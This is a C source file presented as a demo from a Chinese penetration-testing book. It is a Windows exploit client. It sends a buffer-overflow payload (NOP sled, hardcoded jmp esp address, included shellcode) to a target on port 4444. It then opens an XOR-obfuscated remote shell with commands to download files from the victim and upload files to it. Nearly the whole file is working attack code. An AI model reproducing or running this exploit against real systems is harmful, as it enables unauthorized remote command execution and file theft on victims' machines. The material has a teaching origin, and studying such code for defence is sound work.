/* client_fun.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  结合文件上传下载功能的shellcode演示
*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#pragma comment (lib,"ws2_32")

#include "shellcode_fun.c"

// jmp esp address of chinese version
#define JUMPESP "\x12\x45\xfa\x7f"

// ripped from isno
int Make_Connection(char *address,int port,int timeout)
{
    struct sockaddr_in target;
    SOCKET s;
    int i;
    DWORD bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(address);
    if(target.sin_addr.s_addr==0)
    {
        closesocket(s);
        return -2;
    }
    target.sin_port = htons(port);
    bf = 1;
    ioctlsocket(s,FIONBIO,&bf);
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        closesocket(s);
        return -3;
    }
    if(i==0)
    {
        closesocket(s);
        return -4;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        closesocket(s);
        return -5;
    }
    ioctlsocket(s,FIONBIO,&bf);
    return s;
}

void xor_buf(unsigned char *buf, int size)
{
    int i;
    
    for (i=0; i<size; i++) {
        buf[i] ^= Xor_key;
    }
    
    return;
}

/* ripped from TESO code and modifed by ey4s for win32 */
void shell (int sock)
{
    int     l,i,size=0,get_size=0;
    char    buf[1024];
    char    filename[128];
    HANDLE hFile;
    fd_set FdRead;

    struct    timeval time;
    unsigned long    ul[2];

    time.tv_sec = 1;
    time.tv_usec = 0;

    while (1) 
    {
        ul[0] = 1;
        ul[1] = sock;

        l = select (0, (fd_set *)&ul, NULL, NULL, &time);
        if(l==1)
        {
            l = recv (sock, buf, sizeof (buf), 0);
            if (l <= 0) 
            {
                printf ("[-] Connection closed.\n");
                return;
            }
            
            xor_buf(buf, l);
            l = write (1, buf, l);
            if (l <= 0) 
            {
                printf ("[-] Connection closed.\n");
                return;
            }
        }
        else
        {
            l = read (0, buf, sizeof (buf));
            if (l <= 0) 
            {
                printf("[-] Connection closed.\n");
                return;
            }

            xor_buf(buf, l);
            l = send(sock, buf, l, 0);
            if (l <= 0) 
            {
                printf("[-] Connection closed.\n");
                return;
            }
            
            xor_buf(buf, l);

            //+--------------------------------------------
            // get xxx download xxx
            // put xxx upload xxx
            //+--------------------------------------------
            if (strncmp(buf, "get", 3) == 0)
            {
                // obtain filename
                buf[l-1] = 0;
                for (i=l;i>0;i--) {
                    if (buf[i] == '\\' || buf[i] == ' ') {
                        break;
                    }
                }
                strncpy(filename, buf+i+1, l-i-1);

                hFile = CreateFile(
                                    filename,
                                    GENERIC_READ|GENERIC_WRITE,
                                    FILE_SHARE_READ,
                                    NULL,
                                    CREATE_ALWAYS,
                                    FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_ARCHIVE,
                                    (HANDLE)NULL
                                  );

                if ( hFile == INVALID_HANDLE_VALUE ) {
                    printf("Create File %s Error!\n", filename);
                    continue;
                }

                size = 0;

				FD_ZERO(&FdRead);
                FD_SET(sock, &FdRead);

                for (;;) {
                    l = recv(sock, buf, sizeof(buf), 0);
                    xor_buf(buf, l);
                    
                    WriteFile(hFile, buf, l, &i, NULL);

                    size += i;
                    
					l = select (0, &FdRead, NULL, NULL, &time);

                    if (l != 1) {
						memset(buf, 0x0a, 1);
						xor_buf(buf, 1);
						l = send(sock, buf, 1, 0);
                        break;
                    }
                }

                printf("Download remote file %s (%d bytes)!\n", filename, size);

                CloseHandle(hFile);
            }
            else if (strncmp(buf, "put", 3) == 0)
            {
                Sleep(1000);
                
                // obtain filename
                buf[l-1] = 0;
                for (i=l;i>0;i--) {
                    if (buf[i] == '\\' || buf[i] == ' ') {
                        break;
                    }
                }
                strncpy(filename, buf+i+1, l-i-1);

                // open file
                hFile = CreateFile(
                                    filename,
                                    GENERIC_READ|GENERIC_WRITE,
                                    FILE_SHARE_READ,
                                    NULL,
                                    OPEN_EXISTING,
                                    FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_ARCHIVE,
                                    (HANDLE)NULL
                                  );

                if ( hFile == INVALID_HANDLE_VALUE ) {
                    printf("Open File %s Error!\n", filename);
                    continue;
                }

                size = 0;

                // read file and send
                for (;;)
                {
                    ReadFile(hFile, buf, 1024, &i, NULL);

                    if (i == 0)
                    {
                        break;
                    }

                    xor_buf(buf, i);
                    l = send(sock, buf, i, 0);

                    size += l;
                }

                printf("Upload remote file %s (%d bytes)...", filename, size);

                l = recv (sock, buf, sizeof (buf), 0);
                xor_buf(buf, l);
                
                l = write (1, buf, l);

                CloseHandle(hFile);
            }
        }
    }
}

int main(int argc, char *argv[])
{
    unsigned char Buff[2048];
    char data[4] = "Xc0n";

    SOCKET  c,s;
    WSADATA WSAData;

    if(WSAStartup (MAKEWORD(1,1), &WSAData) != 0)
    {
        printf("[-] WSAStartup failed.\n");
        WSACleanup();
        exit(1);
    }

    s = Make_Connection(argv[1], 4444, 10);
    if(s<0)
    {
        printf("[-] connect err.\n");
        exit(1);
    }

    GetShellCode();

    //PrintSc(sh_Buff, sh_Len);

    memset(Buff, 0x90, sizeof(Buff)-1);

    strcpy(Buff+20, JUMPESP);
    strcpy(Buff+24, sh_Buff);
    //strcpy(Buff+56, JUMPESP);
    //strcpy(Buff+60, (unsigned char *)sh_Buff);
    
    //PrintSc(Buff, sizeof(Buff));

    send(s, Buff, sizeof(Buff)-1, 0);
    Sleep(100);

    send(s, data, 4, 0);

    shell(s);

    WSACleanup();
    return 1;
}